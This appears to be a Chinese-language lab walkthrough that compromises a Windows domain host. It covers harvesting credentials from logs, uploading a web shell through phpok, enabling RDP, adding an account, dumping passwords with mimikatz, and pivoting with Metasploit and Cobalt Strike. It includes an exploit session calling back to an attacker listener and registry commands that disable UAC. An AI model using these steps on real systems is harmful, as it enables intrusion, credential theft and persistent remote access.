Web漏洞思路：cms-log文件找到后台密码-后台上传shell-普通用户-提权

扫描发现路径

http://192.168.111.141/web/log/access.log，但未发现敏感信息

还有error.log文件，文件中启用了mod_dumpio来记录post请求，说明如果有登陆的请求，我们可以找到账号密码。在后面的一个登陆包中存在账号密码

进入后台，phpok使用的是4.8.338，存在后台文件上传，上传shell。

添加php后缀

上传后

点击文件，查看文件的地址

查看权限，发现已经为system权限

查看当前域用户

域名为owa.god.org，可登录当前服务器的域管理员为liukaifeng01，查看账号发现是域管理员账号。

尝试把这个服务器给远连一下，查看3389 端口是否开放，利用window注册表查看3389，命令为

REG QUERY "HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Terminal Server" /v fDenyTSConnections

返回为0x1，说明未开放。利用如下开放端口：

REG ADD "HKLM\SYSTEM\CurrentControlSet\Control\Terminal Server" /v fDenyTSConnections /t REG_DWORD /d 00000000 /f

添加账号envl/admin123!@，远连即可

或者上传mimikatz，来获取原账号密码，把shell转移到msf上利用，同时把envl账号getsystem上来

在msf中加载mimikatz，执行密码dump，不过仍然是密文的形式，把shell转移到cs上，利用cs生成后门，使用创建的用户上传执行(虚拟环境变动导致主机IP的变化)

查看存在的网段，只有192.168.120.x这一个网段

扫描网段，查找域主机，通过ping域名和查看当前DNS设置都可以发现域主机为192.168.120.138

扫描主机端口，发现开放了如下端口


为了方便使用msf的exploit模块，把msf带进已有的shell下。创建msf监听

创建一个listeners来用于转发shell，设置为msf的端口地址。使用spwan来选择监听器。

执行后msf上线

如果不需要使用msf来操作当前shell，而是只需要把msf带进内网，可以使用socks转发。先创建一个转发端口。

点击下面的tunnle，可以查看提示的命令，在msf中执行。此处是msf和cs服务器都在一个主机上。这样使用只可以利用msf执行扫描等操作，不能接收反弹shell。需要再修改反向代理setg ReverseAllowProxy true.

为了接收反弹shell，

需要利用proxychains，修改配置文件。就可以使用proxychains msfconsole来把msf带进内网。使用模块执行攻击，后门也使用cs来管理。

利用msf派生一个shell给cs

msf > use exploit/multi/browser/adobe_flash_hacking_team_uaf
msf exploit(multi/browser/adobe_flash_hacking_team_uaf) > set DisablePayloadHandler true
DisablePayloadHandler => true
msf exploit(multi/browser/adobe_flash_hacking_team_uaf) > set LHOST 192.168.130.130
LHOST => 192.168.130.130
msf exploit(multi/browser/adobe_flash_hacking_team_uaf) > set LPORT 8880
LPORT => 8880
[*] Local IP: http://192.168.130.130:80/X11zRtcWP
[*] Server started.

给cs创建一个监听器，端口就是msf中的监听端口，set DisablePayloadHandler true来阻止生成新的连接

利用clone site来创建连接，attack来指向msf生成的地址。如下利用方式，访问地址后就可以获得cs的shell。

创建后门上传后，我们直接就可以获得一个system用户权限shell。

当然，如果不是一开始就是system权限，或者想使用其他的漏洞来获取权限，一般是执行systeminfo来查看补丁，或者使用wmic qfe list来查看更为详细的补丁信息，从结果可以看到就两个补丁信息。

或者使用cs的UAC提权来获得管理员权限。获取hash

或者使用mimikatz来读取密码缓存

上传team viewer绿色版，使用shell命令打开程序

shell .\teamview\Teamviewer\TeamViewerPortable.exe

只不过这样执行后会提示用户账户控制，在不进行操作的i情况下，一段时间后会自动关闭，teamviewer程序启动。

当然如果想关闭用户账户控制，可以利用修改注册表来关闭

reg add "HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System" /v "ConsentPromptBehaviorAdmin" /t reg_dword /d 0 /F
reg add "HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System" /v "EnableLUA" /t reg_dword /d 0 /F
reg add "HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System" /v "PromptOnSecureDesktop" /t reg_dword /d 0 /F

关闭UAC后，再执行打开文件就不在有账户控制提醒，利用explore-Screenshot来截图id和密码，在view中找到screenshots选项，找到对应截图，这种可以在内网隔离只有对外访问权限的时候使用。

如果主机不出内网，可以使用代理转发。添加一个监听器
